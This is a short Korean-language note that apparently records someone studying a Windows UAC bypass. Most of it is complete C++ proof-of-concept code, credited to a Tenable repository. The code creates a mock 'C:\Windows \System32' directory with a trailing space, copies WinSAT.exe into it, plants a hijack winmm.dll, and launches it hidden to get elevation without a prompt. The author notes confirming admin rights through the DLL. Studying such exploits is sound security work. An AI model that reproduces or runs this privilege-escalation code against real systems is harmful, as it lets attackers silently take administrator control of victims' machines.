# UAC Bypass

```
#include "stdafx.h"
#include <Windows.h>
#include "resource.h"

void DropResource(const wchar_t* rsrcName, const wchar_t* filePath) {
	HMODULE hMod = GetModuleHandle(NULL);
	HRSRC res = FindResource(hMod, MAKEINTRESOURCE(L"winmm.dll"), rsrcName);
	DWORD dllSize = SizeofResource(hMod, res);
	void* dllBuff = LoadResource(hMod, res);
	HANDLE hDll = CreateFile(filePath, GENERIC_WRITE, 0, 0, CREATE_ALWAYS, 0, NULL);
	DWORD sizeOut;
	WriteFile(hDll, dllBuff, dllSize, &sizeOut, NULL);
	CloseHandle(hDll);
}

int main()
{
	_SHELLEXECUTEINFOW se = {};
	//Create Mock SystemRoot Directory
	CreateDirectoryW(L"\\\\?\\C:\\Windows \\", 0);
	CreateDirectoryW(L"\\\\?\\C:\\Windows \\System32", 0);
	CopyFileW(L"C:\\Windows\\System32\\WinSAT.exe", L"\\\\?\\C:\\Windows \\System32\\WinSAT.exe", false);

	//Drop our dll for hijack
	DropResource(L"DATA", L"\\\\?\\C:\\Windows \\System32\\winmm.dll");

	//Execute our winSAT.exe copy from fake trusted directory
	se.cbSize = sizeof(_SHELLEXECUTEINFOW);
	se.lpFile =  L"C:\\Windows \\System32\\WinSAT.exe";
	se.lpParameters = L"formal";
	se.nShow = SW_HIDE;
	se.hwnd = NULL;
	se.lpDirectory = NULL;
	ShellExecuteEx(&se);

    	return 0;
}
```

_출처 : https://github.com/tenable/poc/blob/master/Microsoft/Windows/UACBypass/UACBypass.cpp_

```
\\\\?\\
```
 이게 무슨 네이밍규칙 우회한거라는데 추가 조사 필요함.

 위 코드에 어떤 취약점을 이용하면 UAC 검사 없이 바로 관리자권한 실행할 수 있음. 일단 DLL을 통한 관리자 권한 획득은 확인하였고 프로세스 생성하여 권한확인해볼예정